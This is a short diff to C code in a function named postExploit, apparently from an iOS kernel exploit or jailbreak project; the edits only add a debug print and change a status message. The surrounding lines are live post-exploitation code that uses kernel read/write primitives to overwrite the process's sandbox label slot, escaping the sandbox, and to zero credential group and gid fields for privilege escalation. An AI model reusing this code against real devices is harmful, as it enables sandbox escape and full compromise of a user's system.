@@ -39,6 +39,7 @@ void postExploit(void) {
     uint64_t label = kread64(ucred + off_u_cr_label);
     printf("label: 0x%llx\n", label);
     printf("uid: %u\n", kread32(ucred + off_u_cr_uid));
+    printf("sandbox addr: 0x%llx\n", label + 0x10);
     printf("sandbox: %u\n", kread64(label + 0x10));
     //Escape Sandbox
     kwrite64(label + 0x10, 0xffffffffffffffff);
@@ -55,7 +56,7 @@ void postExploit(void) {
     kwrite32(ucred + off_u_cr_groups, 0);
     kwrite32(ucred + off_u_cr_rgid, 0);
     kwrite32(ucred + off_u_cr_svgid, 0);
-    printf("Done! 1\n");
+    printf("Done! 2\n");
     printf("uid: %u\n", kread32(ucred + off_u_cr_uid));
 }
 
